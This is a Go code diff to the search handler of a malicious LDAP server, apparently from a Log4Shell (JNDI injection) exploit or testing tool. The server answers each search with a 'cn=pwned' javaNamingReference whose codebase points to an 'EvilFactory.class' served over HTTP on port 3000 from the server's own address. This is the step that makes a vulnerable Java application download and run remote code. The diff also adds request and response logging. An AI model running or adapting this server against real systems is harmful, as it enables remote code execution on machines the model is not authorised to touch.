@@ -185,15 +185,37 @@ func handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
 		return
 	default:
 	}
+
+	// Report information about the search request.
 	fmt.Printf("Received request from %s\n", aurora.Green(m.Client.GetConn().RemoteAddr()))
-	codebase := message.AttributeValue(fmt.Sprintf("http://%s:3000/evilfactory-1.0-SNAPSHOT.jar", getOwnAddress(m)))
+	fmt.Printf("REQUEST(baseObject):   %s\n", r.BaseObject())
+	/*
+	fmt.Printf("REQUEST(Scope):        %s\n", r.Scope())
+	fmt.Printf("REQUEST(Attributes):   %s\n", r.Attributes())
+	fmt.Printf("REQUEST(Filter):       %s\n", r.Filter())
+	fmt.Printf("REQUEST(FilterString): %s\n", r.FilterString())
+	*/
+
+	// Where to redirect the request to.
+	javaClassName := message.AttributeValue("probably vulnerable")
+	//javaFactoryName := message.AttributeValue("info.jerrinot.log4shell.evilfactory.EvilFactory")
+	//javaCodebase := message.AttributeValue(fmt.Sprintf("http://%s:3000/evilfactory-1.0-SNAPSHOT.jar", getOwnAddress(m)))
+	javaFactoryName := message.AttributeValue("EvilFactory")
+	javaCodebase := message.AttributeValue(fmt.Sprintf("http://%s:3000/EvilFactory.class", getOwnAddress(m)))
+
+	// Formulate the search result object.
 	e := ldap.NewSearchResultEntry("cn=pwned, " + string(r.BaseObject()))
-	e.AddAttribute("cn", "pwned")
-	e.AddAttribute("javaClassName", "probably vulnerable")
-	e.AddAttribute("javaCodeBase", codebase)
 	e.AddAttribute("objectclass", "javaNamingReference")
-	e.AddAttribute("javaFactory", "info.jerrinot.log4shell.evilfactory.EvilFactory")
+	e.AddAttribute("cn", "pwned")
+	e.AddAttribute("javaClassName", javaClassName)
+	e.AddAttribute("javaCodebase", javaCodebase)
+	e.AddAttribute("javaFactoryName", javaFactoryName)
 	w.Write(e)
+
+	// Report information about the search result.
+	fmt.Printf("RESPONSE(javaClassName):   %s\n", javaClassName)
+	fmt.Printf("RESPONSE(javaCodebase):    %s\n", javaCodebase)
+	fmt.Printf("RESPONSE(javaFactoryName): %s\n", javaFactoryName)
 
 	res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
 	w.Write(res)
